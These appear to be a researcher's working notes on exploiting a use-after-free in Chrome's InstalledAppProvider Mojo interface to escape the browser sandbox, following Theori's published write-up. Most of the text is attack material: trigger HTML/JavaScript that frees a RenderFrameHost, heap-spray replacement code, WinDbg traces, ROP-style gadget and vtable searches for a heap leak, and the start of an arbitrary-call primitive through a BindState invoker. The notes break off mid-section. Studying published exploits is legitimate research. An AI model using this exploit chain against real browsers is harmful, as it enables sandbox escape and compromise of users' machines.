# Resources

[Video Explanation of the article by Theori](https://www.youtube.com/watch?v=suPfflpCVQw)

https://ruan777.github.io/2021/12/05/chrome_issue1062091_%E5%88%86%E6%9E%90/#&gid=1&pid=1

https://blog.theori.io/cleanly-escaping-the-chrome-sandbox-1c38abd3c9cb

https://blog.csdn.net/weixin_43815930/article/details/123085070

https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Leecraso-Put-In-One-Bug-And-Pop-Out-More-An-Effective-Way-Of-Bug-Hunting-In-Chrome.pdf

https://www.anquanke.com/post/id/203834

# Uaf

### Trigger

```
<html>
  <head>
    <script src="/mojo/public/js/mojo_bindings.js"></script>
    <script src="/third_party/blink/public/mojom/installedapp/installed_app_provider.mojom.js"></script>
    <script src="/url/mojom/url.mojom.js"></script>
    <script>
      function allocateRFH(src) {
        var iframe = document.createElement("iframe");
        iframe.src = src;
        document.body.appendChild(iframe);
        return iframe;
      }

      function freeRFH(iframe) {
        document.body.removeChild(iframe);
      }

      var kPwnInterfaceName = "pwn";
      function sendPtr() {
        var pipe = Mojo.createMessagePipe();
        // bind the InstalledAppProvider with the child rfh
        Mojo.bindInterface(blink.mojom.InstalledAppProvider.name,
          pipe.handle1, "context", true);
        // pass the endpoint handle to the parent rfh
        Mojo.bindInterface(kPwnInterfaceName, pipe.handle0, "process");
      }

      function getFreedPtr() {
        return new Promise(function (resolve, reject) {
          var frame = allocateRFH(window.location.href + "#child"); // designate the child by hash
          // intercept bindInterface calls for this process to accept the handle from the child
          let interceptor = new MojoInterfaceInterceptor(kPwnInterfaceName, "process");
          interceptor.oninterfacerequest = function(e) {
            interceptor.stop();
            // bind the remote
            var provider_ptr = new blink.mojom.InstalledAppProviderPtr(e.handle);
            freeRFH(frame);
            resolve(provider_ptr);
          }
          interceptor.start();
        });
      }

      async function trigger() {
        if (window.location.hash == "#child") {
          sendPtr();
          return;
        }

        let ptr = await getFreedPtr();
        ptr.filterInstalledApps([], new url.mojom.Url({url: window.location.href}));
      }
  </script>
  </head>
  <body onload="trigger()"></body>
</html>
```

```
0:048> g
(4398.4d7c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Users\asdku\Desktop\cve-2020-\chrome\chrome.dll
00000000`00002002 ??              ???
0:000> k L10
 # Child-SP          RetAddr               Call Site
00 000000cd`10dfdd18 00007ff9`512ed411     0x2002
01 000000cd`10dfdd20 00007ff9`50e7c14b     chrome!content::InstalledAppProviderImpl::FilterInstalledApps+0x31
02 000000cd`10dfddd0 00007ff9`512ed9aa     chrome!blink::mojom::InstalledAppProviderStubDispatch::AcceptWithResponder+0x16f
03 000000cd`10dfdf60 00007ff9`501cca77     chrome!blink::mojom::InstalledAppProviderStub<mojo::RawPtrImplRefTraits<blink::mojom::InstalledAppProvider> >::AcceptWithResponder+0x3a
04 000000cd`10dfdfb0 00007ff9`501cc0e3     chrome!mojo::InterfaceEndpointClient::HandleValidatedMessage+0x20d
05 000000cd`10dfe050 00007ff9`501cbcd1     chrome!mojo::internal::MultiplexRouter::ProcessIncomingMessage+0x17b
06 000000cd`10dfe130 00007ff9`501cb5c6     chrome!mojo::internal::MultiplexRouter::Accept+0xc7
07 000000cd`10dfe340 00007ff9`501ca2c9     chrome!mojo::Connector::DispatchMessageW+0xd8
08 000000cd`10dfe430 00007ff9`501c9f22     chrome!mojo::Connector::ReadAllAvailableMessages+0x1b1
09 (Inline Function) --------`--------     chrome!base::RepeatingCallback<void (unsigned int, const mojo::HandleSignalsState &)>::Run+0xd
0a 000000cd`10dfe580 00007ff9`50147c91     chrome!mojo::SimpleWatcher::OnHandleReady+0xc0
0b (Inline Function) --------`--------     chrome!base::OnceCallback<void ()>::Run+0x12
0c 000000cd`10dfe640 00007ff9`50144b49     chrome!base::TaskAnnotator::RunTask+0x121
0d 000000cd`10dfe740 00007ff9`501448d1     chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl+0x139
0e 000000cd`10dfe880 00007ff9`5023b7d4     chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork+0x61
0f 000000cd`10dfe910 00007ff9`501addbe     chrome!base::MessagePumpForUI::DoRunLoop+0xc4
0:000> u chrome!content::InstalledAppProviderImpl::FilterInstalledApps+0x31-6
chrome!content::InstalledAppProviderImpl::FilterInstalledApps+0x2b [C:\passport\chromium\src\content\browser\installedapp\installed_app_provider_impl.cc @ 26]:
00007ff9`512ed40b 488b01          mov     rax,qword ptr [rcx]
00007ff9`512ed40e ff5048          call    qword ptr [rax+48h]
00007ff9`512ed411 488b10          mov     rdx,qword ptr [rax]
00007ff9`512ed414 4889c1          mov     rcx,rax
00007ff9`512ed417 ff92d0000000    call    qword ptr [rdx+0D0h]
00007ff9`512ed41d 488b10          mov     rdx,qword ptr [rax]
00007ff9`512ed420 4889c1          mov     rcx,rax
00007ff9`512ed423 ff5218          call    qword ptr [rdx+18h]
```

- RCX is ptr?

- RAX could also be ptr?

- [rax+48h] is filterInstalledApps()

### Replacement

```
let allocate = getAllocationConstructor();
const kRenderFrameHostSize = 0xc38;
const kSprayAllocationCount = 0x8;

...

let data = new ArrayBuffer(kRenderFrameHostSize);
let view = new DataView(data);
for (let i = 0; i < kRenderFrameHostSize; i++) {
    view.setUint8(i, 0x41);
}

let ptr = await getFreedPtr();
spray(data);
triggerUAF(ptr);
```

```
0:000> r
rax=4141414141414141 rbx=00000191e5825bf0 rcx=00000191e3061650
rdx=00000014c03fdea0 rsi=00000014c03fdec0 rdi=0000000000000000
rip=00007ff96f60d40e rsp=00000014c03fddc0 rbp=0000000000000002
 r8=00000014c03fded8  r9=00000014c03fdec0 r10=0000000000000000
r11=8504602e3aee1000 r12=00000014c03fe028 r13=0000000000000000
r14=00000014c03fdea0 r15=00000014c03fdf68
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
chrome!content::InstalledAppProviderImpl::FilterInstalledApps+0x2e:
00007ff9`6f60d40e ff5048          call    qword ptr [rax+48h] ds:41414141`41414189=????????????????
0:000> dq @rcx
00000191`e3061650  41414141`41414141 41414141`41414141
00000191`e3061660  41414141`41414141 41414141`41414141
00000191`e3061670  41414141`41414141 41414141`41414141
00000191`e3061680  41414141`41414141 41414141`41414141
00000191`e3061690  41414141`41414141 41414141`41414141
00000191`e30616a0  41414141`41414141 41414141`41414141
00000191`e30616b0  41414141`41414141 41414141`41414141
00000191`e30616c0  41414141`41414141 41414141`41414141
```

### No crash

```
void InstalledAppProviderImpl::FilterInstalledApps(
    std::vector<blink::mojom::RelatedApplicationPtr> related_apps,
    const GURL& manifest_url,
    FilterInstalledAppsCallback callback) {
  if (render_frame_host_->GetProcess()->GetBrowserContext()->IsOffTheRecord()) { <- crash here
    std::move(callback).Run(std::vector<blink::mojom::RelatedApplicationPtr>());
    return;
  }
  ...
```

```
0:000> u @rip L10
chrome!content::InstalledAppProviderImpl::FilterInstalledApps+0x2e [C:\passport\chromium\src\content\browser\installedapp\installed_app_provider_impl.cc @ 26]:
00007ff9`6f60d40e ff5048          call    qword ptr [rax+48h]  <- GetProcess()
00007ff9`6f60d411 488b10          mov     rdx,qword ptr [rax]
00007ff9`6f60d414 4889c1          mov     rcx,rax
00007ff9`6f60d417 ff92d0000000    call    qword ptr [rdx+0D0h] <- GetBrowserContext()
00007ff9`6f60d41d 488b10          mov     rdx,qword ptr [rax]
00007ff9`6f60d420 4889c1          mov     rcx,rax
00007ff9`6f60d423 ff5218          call    qword ptr [rdx+18h]  <- IsOffTheRecord()
00007ff9`6f60d426 84c0            test    al,al
00007ff9`6f60d428 7432            je      chrome!content::InstalledAppProviderImpl::FilterInstalledApps+0x7c (00007ff9`6f60d45c)
00007ff9`6f60d42a 0f57c0          xorps   xmm0,xmm0
00007ff9`6f60d42d 488d5c2460      lea     rbx,[rsp+60h]
00007ff9`6f60d432 0f2903          movaps  xmmword ptr [rbx],xmm0
00007ff9`6f60d435 31c0            xor     eax,eax
00007ff9`6f60d437 48894310        mov     qword ptr [rbx+10h],rax
00007ff9`6f60d43b 488b0e          mov     rcx,qword ptr [rsi]
00007ff9`6f60d43e 488d7c2478      lea     rdi,[rsp+78h]
```

- render_frame_host_ is the target object in the UaF

- `call    qword ptr [rax+48h] ds:4141414141414189=????????????????` occurs cause the entire render_frame_host_ is replaced with As

- To prevent the first crash, the first 8 bytes need to be some valid pointer

- We observe that when we return from the first call, we will execute `rdx,qword ptr [rax]`, which means that we need to ensure that the first valid pointer returns some valid pointer in RAX. This behavior must be maintained for `call    qword ptr [rdx+0D0h]`

```
0:  48 8d 41 08             lea    rax,[rcx+0x8]
4:  c3                      ret 
```

```
0:049> s -b 00007ff9`6e450000 00007ff9`75d65000 48 8d 41 08 c3 cc
00007ff9`6eb48870  48 8d 41 08 c3 cc 48 8d-0d 2b 7a b4 06 e9 00 00  H.A...H..+z.....
0:049> u 00007ff9`6eb48870 
chrome!ChromeMainDelegate::CreateContentClient [C:\passport\chromium\src\chrome\app\chrome_main_delegate.cc @ 1197]:
00007ff9`6eb48870 488d4108        lea     rax,[rcx+8]
00007ff9`6eb48874 c3              ret
00007ff9`6eb48875 cc              int     3
chrome!ChromeMainDelegate::CreateContentGpuClient [C:\passport\chromium\src\chrome\app\chrome_main_delegate.cc @ 1220]:
00007ff9`6eb48876 488d0d2b7ab406  lea     rcx,[chrome!g_chrome_content_gpu_client (00007ff9`756902a8)]
00007ff9`6eb4887d e900000000      jmp     chrome!base::LazyInstance<ChromeContentGpuClient,base::internal::DestructorAtExitLazyInstanceTraits<ChromeContentGpuClient> >::Pointer (00007ff9`6eb48882)
chrome!base::LazyInstance<ChromeContentGpuClient,base::internal::DestructorAtExitLazyInstanceTraits<ChromeContentGpuClient> >::Pointer [C:\passport\chromium\src\base\lazy_instance.h @ 151]:
00007ff9`6eb48882 56              push    rsi
00007ff9`6eb48883 57              push    rdi
00007ff9`6eb48884 4883ec28        sub     rsp,28h
0:049> s -b 00007ff9`6e450000 00007ff9`75d65000 70 88 b4 6e f9 7f 00 00
00007ff9`74680450  70 88 b4 6e f9 7f 00 00-28 2f 46 6e f9 7f 00 00  p..n....(/Fn....
00007ff9`746b6d70  70 88 b4 6e f9 7f 00 00-a6 99 c0 6e f9 7f 00 00  p..n.......n....
00007ff9`746b7110  70 88 b4 6e f9 7f 00 00-54 f8 62 74 f9 7f 00 00  p..n....T.bt....
0:049> !vprot 00007ff9`74680450 
BaseAddress:       00007ff974680000
AllocationBase:    00007ff96e450000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        0000000000fac000
State:             00001000  MEM_COMMIT
Protect:           00000002  PAGE_READONLY
Type:              01000000  MEM_IMAGE
0:049> !vprot 00007ff9`6eb48870
BaseAddress:       00007ff96eb48000
AllocationBase:    00007ff96e450000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        0000000005b38000
State:             00001000  MEM_COMMIT
Protect:           00000020  PAGE_EXECUTE_READ
Type:              01000000  MEM_IMAGE

```

- Using [defuse.ca](https://defuse.ca/online-x86-assembler.htm#disassembly) and following the guide by theori, we want to find byte patterns of `48 8d 41 08 c3`

```
0:028> g
(27ec.18e8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Users\asdku\Desktop\cve-2020-\chrome\chrome.dll
chrome!content::InstalledAppProviderImpl::FilterInstalledApps+0x43:
00007ff9`6f60d423 ff5218          call    qword ptr [rdx+18h] ds:cafebabe`deadbeef=????????????????
```

### Heap Leak

```
0:000> x chrome!*GetWakeLockContext
00007ff9`6e926cc8 chrome!content::WebContentsImpl::GetWakeLockContext (void)
00007ff9`6e926d0f chrome!content::WakeLockContextHost::GetWakeLockContext =  (inline caller) chrome!content::WebContentsImpl::GetWakeLockContext+47
0:000> ? 00007ff9`6e926cc8 - chrome
Evaluate expression: 5074120 = 00000000`004d6cc8
0:000> s -b 00007ff9`6e450000 00007ff9`75d65000 c8 6c 92 6e f9 7f 00 00
00007ff9`74923af8  c8 6c 92 6e f9 7f 00 00-f8 74 79 6f f9 7f 00 00  .l.n.....tyo....
0:000> dq 00007ff9`74923af8
00007ff9`74923af8  00007ff9`6e926cc8 00007ff9`6f7974f8
00007ff9`74923b08  00007ff9`6f7977c4 00007ff9`6f79792a
00007ff9`74923b18  00007ff9`6f797968 00007ff9`6ea98d18
00007ff9`74923b28  00007ff9`6e923152 00007ff9`6f797970
00007ff9`74923b38  00007ff9`6f7979b2 00007ff9`6f797a2a
00007ff9`74923b48  00007ff9`6f798faa 00007ff9`6f79cf08
00007ff9`74923b58  00007ff9`6f79ce6c 00007ff9`6f792fb8
00007ff9`74923b68  00007ff9`6f79a69e 00007ff9`6f79a63a
0:000> ? 00007ff9`74923af8-chrome
Evaluate expression: 105724664 = 00000000`064d3af8
0:000> u 00007ff9`74923af8
chrome!content::WebContentsImpl::`vftable'+0x4a8:
```

```
0:000> u chrome!content::WebContentsImpl::GetWakeLockContext L20
chrome!content::WebContentsImpl::GetWakeLockContext [C:\passport\chromium\src\content\browser\web_contents\web_contents_impl.cc @ 3368]:
00007ff9`6e926cc8 56              push    rsi
00007ff9`6e926cc9 57              push    rdi
00007ff9`6e926cca 53              push    rbx
00007ff9`6e926ccb 4883ec20        sub     rsp,20h
00007ff9`6e926ccf 488bb950060000  mov     rdi,qword ptr [rcx+650h]
00007ff9`6e926cd6 4885ff          test    rdi,rdi
00007ff9`6e926cd9 7534            jne     chrome!content::WebContentsImpl::GetWakeLockContext+0x47 (00007ff9`6e926d0f)
00007ff9`6e926cdb 4889ce          mov     rsi,rcx
00007ff9`6e926cde 488db950060000  lea     rdi,[rcx+650h]
00007ff9`6e926ce5 b940000000      mov     ecx,40h
00007ff9`6e926cea e8014ed005      call    chrome!operator new (00007ff9`7462baf0)
00007ff9`6e926cef 4889c3          mov     rbx,rax
00007ff9`6e926cf2 4889c1          mov     rcx,rax
00007ff9`6e926cf5 4889f2          mov     rdx,rsi
00007ff9`6e926cf8 e839000000      call    chrome!content::WakeLockContextHost::WakeLockContextHost (00007ff9`6e926d36)
00007ff9`6e926cfd 4889f9          mov     rcx,rdi
00007ff9`6e926d00 4889da          mov     rdx,rbx
00007ff9`6e926d03 e8a8060000      call    chrome!std::__1::unique_ptr<content::WakeLockContextHost,std::__1::default_delete<content::WakeLockContextHost> >::reset (00007ff9`6e9273b0)
00007ff9`6e926d08 488bbe50060000  mov     rdi,qword ptr [rsi+650h]
00007ff9`6e926d0f 837f2000        cmp     dword ptr [rdi+20h],0
00007ff9`6e926d13 7507            jne     chrome!content::WebContentsImpl::GetWakeLockContext+0x54 (00007ff9`6e926d1c)
00007ff9`6e926d15 48837f1800      cmp     qword ptr [rdi+18h],0
00007ff9`6e926d1a 7415            je      chrome!content::WebContentsImpl::GetWakeLockContext+0x69 (00007ff9`6e926d31)
00007ff9`6e926d1c 488d4f10        lea     rcx,[rdi+10h]
00007ff9`6e926d20 e8cb040000      call    chrome!mojo::internal::InterfacePtrState<device::mojom::WakeLockContext>::ConfigureProxyIfNecessary (00007ff9`6e9271f0)
00007ff9`6e926d25 488b4738        mov     rax,qword ptr [rdi+38h]
00007ff9`6e926d29 4883c420        add     rsp,20h
00007ff9`6e926d2d 5b              pop     rbx
00007ff9`6e926d2e 5f              pop     rdi
00007ff9`6e926d2f 5e              pop     rsi
00007ff9`6e926d30 c3              ret
```

```
device::mojom::WakeLockContext* WebContentsImpl::GetWakeLockContext() {
  if (!wake_lock_context_host_)
    wake_lock_context_host_.reset(new WakeLockContextHost(this));
  return wake_lock_context_host_->GetWakeLockContext();
}
```

```
void VirtualFunction() override() {
    some_member_ = new SomeClass();
}
```

- We need to find a virtual function which stores and allocates the result as a member

- `device::mojom::WakeLockContext* WebContentsImpl::GetWakeLockContext()` is selected

- bp chrome+0x004d6cc8

- bp chrome+011bd423

```
Breakpoint 0 hit
chrome!content::WebContentsImpl::GetWakeLockContext:
00007ff9`6e926cc8 56              push    rsi
0:000> r
rax=00000232565e81c0 rbx=00000232560947b0 rcx=00000232565e81c0
rdx=00007ff974923ae0 rsi=000000ae54ffde00 rdi=0000000000000000
rip=00007ff96e926cc8 rsp=000000ae54ffdcf8 rbp=0000000000000002
 r8=000000ae54ffde18  r9=000000ae54ffde00 r10=0000000000000000
r11=4fd531d6f8bf0500 r12=000000ae54ffdf68 r13=0000000000000000
r14=000000ae54ffdde0 r15=000000ae54ffdea8
iopl=0         nv up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
chrome!content::WebContentsImpl::GetWakeLockContext:
00007ff9`6e926cc8 56              push    rsi
0:000> dq 00000232565e81c0
00000232`565e81c0  00007ff9`74923ae0 41414141`41414141
00000232`565e81d0  41414141`41414141 41414141`41414141
00000232`565e81e0  41414141`41414141 41414141`41414141
00000232`565e81f0  41414141`41414141 41414141`41414141
00000232`565e8200  41414141`41414141 41414141`41414141
00000232`565e8210  41414141`41414141 41414141`41414141
00000232`565e8220  41414141`41414141 41414141`41414141
00000232`565e8230  41414141`41414141 41414141`41414141
0:000> dq 00000232565e81c0-10
00000232`565e81b0  00007ff9`74680408 00007ff9`74680380
00000232`565e81c0  00007ff9`74923ae0 41414141`41414141
00000232`565e81d0  41414141`41414141 41414141`41414141
00000232`565e81e0  41414141`41414141 41414141`41414141
00000232`565e81f0  41414141`41414141 41414141`41414141
00000232`565e8200  41414141`41414141 41414141`41414141
00000232`565e8210  41414141`41414141 41414141`41414141
00000232`565e8220  41414141`41414141 41414141`41414141
0:000> pt
(3254.49e0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
chrome!mojo::Handle::is_valid [inlined in chrome!content::WebContentsImpl::GetWakeLockContext+0x47]:
00007ff9`6e926d0f 837f2000        cmp     dword ptr [rdi+20h],0 ds:41414141`41414161=????????
```

- Let's change everything back to 0s

```
0:000> g
Breakpoint 0 hit
chrome!content::InstalledAppProviderImpl::FilterInstalledApps+0x43:
00007ff9`6f60d423 ff5218          call    qword ptr [rdx+18h] ds:00007ff9`74923af8={chrome!content::WebContentsImpl::GetWakeLockContext (00007ff9`6e926cc8)}
0:000> dv
           this = 0x000001fb`a0b88bd0
   related_apps = 0x00000000`00000000
   manifest_url = <value unavailable>
       callback = class base::OnceCallback<void (std::__1::vector<mojo::InlinedStructPtr<blink::mojom::RelatedApplication>,std::__1::allocator<mojo::InlinedStructPtr<blink::mojom::RelatedApplication> > >)>
 is_implemented = <value unavailable>
0:000> r
rax=000001fb9d8bb840 rbx=000001fba0b88bd0 rcx=000001fb9d8bb840
rdx=00007ff974923ae0 rsi=000000e315bfdd90 rdi=0000000000000000
rip=00007ff96f60d423 rsp=000000e315bfdc90 rbp=0000000000000002
 r8=000000e315bfdda8  r9=000000e315bfdd90 r10=0000000000000140
r11=0000800000000003 r12=000000e315bfdef8 r13=0000000000000000
r14=000000e315bfdd70 r15=000000e315bfde38
iopl=0         nv up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
chrome!content::InstalledAppProviderImpl::FilterInstalledApps+0x43:
00007ff9`6f60d423 ff5218          call    qword ptr [rdx+18h] ds:00007ff9`74923af8={chrome!content::WebContentsImpl::GetWakeLockContext (00007ff9`6e926cc8)}
0:000> dx -r1 ((chrome!content::InstalledAppProviderImpl *)0x1fba0b88bd0)
((chrome!content::InstalledAppProviderImpl *)0x1fba0b88bd0)                 : 0x1fba0b88bd0 [Type: content::InstalledAppProviderImpl *]
    [=0x7ff9747f7290] Name_            : "blink.mojom.InstalledAppProvider" [Type: char [0]]
    Version_         : 0x0 [Type: unsigned int]
    PassesAssociatedKinds_ : false [Type: bool]
    HasSyncMethods_  : false [Type: bool]
    [+0x008] render_frame_host_ : 0x1fb9d8bb830 [Type: content::RenderFrameHost *]
```

```
0:019> dq 1fba020bbf0
000001fb`a020bbf0  000001fb`00000005 000001fb`9d8bb840
000001fb`a020bc00  000001fb`a5f50740 000001fb`a5ef8910
000001fb`a020bc10  00000000`00000000 00000000`00000000
000001fb`a020bc20  00000000`00000000 000001fb`a5f28190
000001fb`a020bc30  00000037`00000001 8000ba00`9711251e
000001fb`a020bc40  000001fb`00000000 00007ff9`6f9112e6
000001fb`a020bc50  00007ff9`6eb5ae10 00007ff9`6eb6930e
000001fb`a020bc60  00007ff9`6f910802 00007ff9`00000000
0:019> dq 000001fb`9d8bb840+620
000001fb`9d8bbe60  00000000`00000000 00000000`00000000
000001fb`9d8bbe70  00000000`00000000 00000000`00000000
000001fb`9d8bbe80  00000000`00000000 00000000`00000000
000001fb`9d8bbe90  000001fb`a020bbf0 00000000`00000000 <- heap leakerinoz
000001fb`9d8bbea0  00000000`00000000 00000000`00000000
000001fb`9d8bbeb0  00000000`00000000 00000000`00000000
000001fb`9d8bbec0  00000000`00000000 00000000`00000000
000001fb`9d8bbed0  00000000`00000000 00000000`00000000
```

- Pointer to render_frame_host_ is 0x1fb9d8bb830

- Leak value: 1fba020bbf0

- We can see that in this leaked value of 1fba020bbf0, the pointer to our render_frame_host_ can be found at +0x8 offset (somehow. lol.)

```
void VirtualFunction() override {
    some_member_ = other_member_.some_attr;
}
```

```
void Start() override {
    ASSERT(!IsStarted());
    dict_iterator_ = locker_.begin();
}
```

```
0:012> x chrome!*DictionaryIterator::Start*
*** WARNING: Unable to verify checksum for C:\Users\asdku\Desktop\cve-2020-\chrome\chrome.dll
00007ff9`7093938e chrome!`anonymous namespace'::DictionaryIterator::Start (void)
0:012> u 7ff97093938e L10
chrome!`anonymous namespace'::DictionaryIterator::Start [C:\passport\chromium\src\third_party\pdfium\core\fpdfapi\parser\cpdf_object_walker.cpp @ 56]:
00007ff9`7093938e 55              push    rbp
00007ff9`7093938f 4889e5          mov     rbp,rsp
00007ff9`70939392 488b4120        mov     rax,qword ptr [rcx+20h]
00007ff9`70939396 83781800        cmp     dword ptr [rax+18h],0
00007ff9`7093939a 740a            je      chrome!`anonymous namespace'::DictionaryIterator::Start+0x18 (00007ff9`709393a6)
00007ff9`7093939c 488b4028        mov     rax,qword ptr [rax+28h]
00007ff9`709393a0 48894118        mov     qword ptr [rcx+18h],rax
00007ff9`709393a4 5d              pop     rbp
00007ff9`709393a5 c3              ret
0:012> ? 7ff97093938e -chrome
Evaluate expression: 38704014 = 00000000`024e938e
0:012> s -b 00007ff9`6e450000 00007ff9`75d65000 8e 93 93 70 f9 7f 00 00
00007ff9`74bcca48  8e 93 93 70 f9 7f 00 00-ac 93 93 70 f9 7f 00 00  ...p.......p....
0:012> ? 00007ff9`74bcca48 - chrome
Evaluate expression: 108513864 = 00000000`0677ca48
```

- We want to get the pointer to our render_frame_host_

- We will need to use a virtual function with the above form

- bp chrome+0x024e938e

```
0:012> g
Breakpoint 1 hit
chrome!`anonymous namespace'::DictionaryIterator::Start:
00007ff9`7093938e 55              push    rbp
0:000> r
rax=00000152863c5270 rbx=0000015286997100 rcx=00000152863c5270
rdx=00007ff974bcca30 rsi=0000003207dfe2c0 rdi=0000000000000000
rip=00007ff97093938e rsp=0000003207dfe1b8 rbp=0000000000000002
 r8=0000003207dfe2d8  r9=0000003207dfe2c0 r10=0000000000000140
r11=0004662d0016007c r12=0000003207dfe428 r13=0000000000000000
r14=0000003207dfe2a0 r15=0000003207dfe368
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
chrome!`anonymous namespace'::DictionaryIterator::Start:
00007ff9`7093938e 55              push    rbp
0:000> dq 00000152863c5270
00000152`863c5270  00007ff9`74bcca30 41414141`41414141 <- second UaF
00000152`863c5280  00000000`00000000 00000000`00000000
00000152`863c5290  00000000`00000000 00000000`00000000
00000152`863c52a0  00000000`00000000 00000000`00000000
00000152`863c52b0  00000000`00000000 00000000`00000000
00000152`863c52c0  00000000`00000000 00000000`00000000
00000152`863c52d0  00000000`00000000 00000000`00000000
00000152`863c52e0  00000000`00000000 00000000`00000000
0:000> dq 00000152882ddc90
00000152`882ddc90  70747468`00000003 00000152`86504700 <- first UaF
00000152`882ddca0  00000152`883bc610 00000152`8834af60
00000152`882ddcb0  00007ff9`00000000 00000000`00000000
00000152`882ddcc0  00000152`00000000 00000152`8839e460
00000152`882ddcd0  41a80000`422da000 90005202`cd79150e
00000152`882ddce0  41a80000`00000001 00007ff9`7104b6b0
00000152`882ddcf0  00007ff9`6eb493e0 00007ff9`6eb5c3b0
00000152`882ddd00  00007ff9`6ea9f140 00000152`83006220
0:000> dq 00000152`86504700
00000152`86504700  00007ff9`74923ae0 00000000`00000000 <- first UaF
00000152`86504710  00000000`00000000 00000000`00000000
00000152`86504720  00000000`00000000 00000000`00000000
00000152`86504730  00000000`00000000 00000000`00000000
00000152`86504740  00000000`00000000 00000000`00000000
00000152`86504750  00000000`00000000 00000000`00000000
00000152`86504760  00000000`00000000 00000000`00000000
00000152`86504770  00000000`00000000 00000000`00000000
```

- `0x00000152863c5270+0x20` needs to have something if not we get NPD

- We will use wakeLockContextAddr

- wakeLockContextAddr+0x18 MUST not be 0 if not it will hit an int3 (pure luck)

```
chrome!std::__1::__tree<std::__1::__value_type<fxcrt::ByteString,fxcrt::RetainPtr<CPDF_Object> >,std::__1::__map_value_compare<fxcrt::ByteString,std::__1::__value_type<fxcrt::ByteString,fxcrt::RetainPtr<CPDF_Object> >,std::__1::less<fxcrt::ByteString>,1>,std::__1::allocator<std::__1::__value_type<fxcrt::ByteString,fxcrt::RetainPtr<CPDF_Object> > > >::begin [inlined in chrome!`anonymous namespace'::DictionaryIterator::Start+0xe]:
00007ff9`7093939c 488b4028        mov     rax,qword ptr [rax+28h] ds:000001b3`1575bb38=0000000000000000
0:000> dq 000001b31575bb10 
000001b3`1575bb10  000001b3`0000006a 000001b3`15a48910
000001b3`1575bb20  000001b3`15aa56d0 000001b3`158d8cd0
000001b3`1575bb30  00000000`00000000 00000000`00000000
000001b3`1575bb40  00000000`00000000 000001b3`1445df30
000001b3`1575bb50  00000000`00000000 8800ba00`999993f7
000001b3`1575bb60  2e6b726f`00000001 000001b3`0a97b230
000001b3`1575bb70  000106f9`11dc0c01 000001b3`157f30f0
000001b3`1575bb80  00000001`000106f8 000001b3`157f3fb0
0:000> dq 000001b31575bb10 L1
000001b3`1575bb10  000001b3`0000006a
0:000> dq 000001b31575bb10+28 L1
000001b3`1575bb38  00000000`00000000
0:000> dq 000001b31575bb10+28-8*1 L1
000001b3`1575bb30  00000000`00000000
0:000> dq 000001b31575bb10+28-8*2 L1
000001b3`1575bb28  000001b3`158d8cd0
0:000> dq 000001b31575bb10+28-8*3 L1
000001b3`1575bb20  000001b3`15aa56d0
0:000> dq 000001b31575bb10+28-8*4 L1 
000001b3`1575bb18  000001b3`15a48910
0x8*4=0x20
```

- subtract -0x20 from wakeLockContextAddr

```
0:000> t
chrome!std::__1::__tree<std::__1::__value_type<fxcrt::ByteString,fxcrt::RetainPtr<CPDF_Object> >,std::__1::__map_value_compare<fxcrt::ByteString,std::__1::__value_type<fxcrt::ByteString,fxcrt::RetainPtr<CPDF_Object> >,std::__1::less<fxcrt::ByteString>,1>,std::__1::allocator<std::__1::__value_type<fxcrt::ByteString,fxcrt::RetainPtr<CPDF_Object> > > >::begin [inlined in chrome!`anonymous namespace'::DictionaryIterator::Start+0xe]:
00007ff9`7093939c 488b4028        mov     rax,qword ptr [rax+28h] ds:000001c9`0d1b1ba8=000001c90ce75d50
0:000> dq @rax+28
000001c9`0d1b1ba8  000001c9`0ce75d50 
0:000> dq 000001c9`0ce75d50
000001c9`0ce75d50  00007ff9`74923ae0 00000000`00000000
000001c9`0ce75d60  00000000`00000000 00000000`00000000
0:000> t
chrome!`anonymous namespace'::DictionaryIterator::Start+0x12:
00007ff9`709393a0 48894118        mov     qword ptr [rcx+18h],rax ds:000001c9`0f8627f8=0000000000000000
0:000> dq @rcx
000001c9`0f8627e0  00007ff9`74bcca30 00000000`00000000
000001c9`0f8627f0  00000000`00000000 00000000`00000000 <- so the RAX (with the heap leak) will come here
000001c9`0f862800  000001c9`0d1b1b80 00000000`00000000
000001c9`0f862810  00000000`00000000 00000000`00000000
```

- We can read this value from +0x28 which is what we do

### Arbitrary Call

```
0:000> x chrome!*Invoker*BindState*base::WaitableEvent*
0:000> u 00007ff9`6f268500
chrome!base::internal::Invoker<base::internal::BindState<void (blink::MemoryAblationExperiment::*)(unsigned long long),base::internal::UnretainedWrapper<blink::MemoryAblationExperiment>,unsigned long long>,void ()>::RunOnce:
00007ff9`6f268500 4c8b4120        mov     r8,qword ptr [rcx+20h]
00007ff9`6f268504 488b4128        mov     rax,qword ptr [rcx+28h]
00007ff9`6f268508 488b5130        mov     rdx,qword ptr [rcx+30h]
00007ff9`6f26850c 4889c1          mov     rcx,rax
00007ff9`6f26850f 49ffe0          jmp     r8
00007ff9`6f268512 cc              int     3
00007ff9`6f268513 cc              int     3
chrome!blink::DocumentPolicy::CreateWithHeaderPolicy [C:\passport\chromium\src\third_party\blink\common\feature_policy\document_policy.cc @ 17]:
00007ff9`6f268514 56              push    rsi
0:000> ? 00007ff9`6f268500 - chrome
Evaluate expression: 14779648 = 00000000`00e18500
```

- We need BindState Invokers which give us register control

- This one give us 3 register control, just nice - 1 for function, 2 for arguments

```
0:039> x chrome!*blink::FileSystemDispatcher::WriteListener::DidWrite*
00007ff9`6f6f21c0 chrome!blink::FileSystemDispatcher::WriteListener::DidWrite
```

- This give us a valid virtual table function and virtual function pointer for us to go to bindstate

- bp chrome+0x064c8078n

```
